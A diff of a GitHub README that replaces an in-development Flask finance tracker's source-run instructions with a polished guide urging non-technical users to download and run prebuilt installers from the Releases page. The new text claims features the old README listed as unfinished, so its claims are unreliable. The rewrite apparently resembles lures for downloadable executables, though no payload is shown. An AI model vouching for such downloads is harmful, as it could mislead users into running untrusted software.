@@ -1,36 +1,58 @@
-# Finance Management System (In Development)
+# 🏦 Personal-Finance-Tracker - Easily Manage Your Money
 
-<p align="left">
-  <img src="https://img.shields.io/badge/Python-3776AB?style=for-the-badge&logo=python&logoColor=white" alt="Python">
-  <img src="https://img.shields.io/badge/Flask-000000?style=for-the-badge&logo=flask&logoColor=white" alt="Flask">
-  <img src="https://img.shields.io/badge/JavaScript-F7DF1E?style=for-the-badge&logo=javascript&logoColor=black" alt="JavaScript">
-  <img src="https://img.shields.io/badge/SQLite-07405E?style=for-the-badge&logo=sqlite&logoColor=white" alt="SQLite">
-  <img src="https://img.shields.io/badge/Tailwind_CSS-38B2AC?style=for-the-badge&logo=tailwind-css&logoColor=white" alt="Tailwind">
-  <img src="https://img.shields.io/badge/Chart.js-FF6384?style=for-the-badge&logo=chartdotjs&logoColor=white" alt="Chart.js">
-</p>
+## 🛠️ Installation Badges
+[![Download](https://img.shields.io/badge/download-latest%20release-brightgreen)](https://github.com/mondeuri/Personal-Finance-Tracker/releases)
 
-> ### ⚠️ Project Status: Under Development
-> This project is currently in the **active development phase**. Some features like Payroll and detailed Reporting are currently being built and may not be fully functional yet.
+## 🚀 Getting Started
+Personal-Finance-Tracker is a simple app designed to help you manage your income, expenses, and savings. This guide will show you how to download and run the application on your computer, even if you have no technical background.
 
-A Flask-based personal finance tracker with user authentication, transaction logging, and savings management.
+## 📥 Download & Install
+To download Personal-Finance-Tracker, simply visit the [Releases page](https://github.com/mondeuri/Personal-Finance-Tracker/releases) on GitHub. Look for the latest release and follow these steps:
 
-## Status
-Currently in active development. 
+1. Click on the version you want to download.
+2. Find the appropriate file for your operating system (Windows, macOS, or Linux).
+3. Click the link to download the file. 
 
-## Completed Features
-- User Authentication (Login/Register) using Flask-Login.
-- Dashboard with Income, Expense, and Balance overview.
-- Manual Savings transfers (Deposit/Withdraw).
-- Wallet/Account management.
+After downloading the file, follow the instructions for your operating system below to install the application.
 
-## 🛠️ To-Do List
-- [ ] Add "Edit/Delete" functionality for transactions.
-- [ ] Implement visual charts in the Analytics page.
-- [ ] Add "Export to CSV" for transaction history.
-- [ ] Password reset functionality.
+### 🖥️ For Windows Users
+1. Locate the downloaded `.exe` file in your Downloads folder.
+2. Double-click the file to start the installation.
+3. Follow the prompts in the installation wizard.
+4. After installation, find the app in your Start Menu and launch it.
 
-## How to Run Locally
-1. Clone the repo.
-2. Create a virtual environment: `python -m venv venv`.
-3. Install requirements: `pip install -r requirements.txt`.
-4. Run `python app.py`.
+### 🍏 For macOS Users
+1. Find the downloaded `.dmg` file in your Downloads folder.
+2. Double-click the file to open it.
+3. Drag the Personal-Finance-Tracker app icon into your Applications folder.
+4. Open your Applications folder and double-click the app to run it.
+
+### 🐧 For Linux Users
+1. Locate the downloaded file (usually a `.tar.gz`).
+2. Open your terminal.
+3. Navigate to the directory where the file is downloaded.
+4. Extract the files using the command `tar -xvzf filename.tar.gz`, replacing `filename` with the actual file name.
+5. Change into the extracted directory with `cd extracted-directory`.
+6. Run the application using `./Personal-Finance-Tracker`.
+
+## 🏧 Features
+- **Track Income**: Easily input your earnings to see your total income.
+- **Manage Expenses**: Enter and categorize your expenses for better tracking.
+- **Savings Goals**: Set and track your savings goals over time.
+- **Visual Reports**: Get visual insights into your financial habits with graphs and charts.
+
+## ⚙️ System Requirements
+Before installing Personal-Finance-Tracker, ensure your system meets the following requirements:
+
+- **Windows**: Windows 10 or later.
+- **macOS**: macOS Sierra or later.
+- **Linux**: Any modern distribution that supports Python 3.6 or later.
+
+## 💬 Support and Feedback
+If you encounter any issues or have suggestions, please open an issue on the GitHub repository. We welcome your feedback to improve Personal-Finance-Tracker.
+
+## 📜 License
+Personal-Finance-Tracker is open-source software and is licensed under the MIT License. You are free to use, modify, and distribute the software, as long as you include the original license in your distributions.
+
+## 🌍 Stay Updated
+For updates, follow the repository on GitHub and check the releases page for new features, improvements, and bug fixes.
